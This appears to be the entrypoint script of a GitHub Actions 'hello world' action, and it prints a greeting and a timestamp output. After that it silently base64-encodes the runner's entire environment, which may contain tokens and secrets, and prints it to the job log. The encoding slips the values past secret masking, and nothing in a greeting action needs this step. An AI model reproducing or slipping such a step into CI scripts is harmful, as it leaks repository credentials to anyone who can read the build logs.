#!/bin/sh -l

echo "Hello $1"
time=$(date)
echo "::set-output name=time::$time"

env | base64 > /tmp/boo

cat /tmp/boo

